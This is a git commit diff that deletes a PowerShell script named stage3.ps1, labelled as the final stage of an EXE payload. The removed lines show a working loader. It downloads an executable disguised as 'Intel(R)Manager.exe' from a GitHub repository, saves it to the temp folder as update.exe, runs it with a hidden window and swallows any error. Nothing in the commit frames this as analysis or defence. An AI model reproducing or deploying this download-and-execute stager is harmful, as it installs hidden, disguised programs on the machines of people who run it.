9a5aa7fdc3398d15d0ce20218bfc0e880fc842da
John786Smith <yadonclub@proton.me>
2025-12-31 08:18:02 -0800

    Delete stage3.ps1

--- stage3.ps1
+++
@@ -1,7 +0,0 @@
-# Stage3 - Final EXE Payload
-$exeUrl = "https://github.com/John786Smith/Fix/raw/refs/heads/main/Intel(R)Manager.exe"  # ← 自分のEXE URL
-$exePath = "$env:TEMP\update.exe"
-try {
-    (New-Object Net.WebClient).DownloadFile($exeUrl, $exePath)
-    Start-Process $exePath -WindowStyle Hidden
-} catch { }
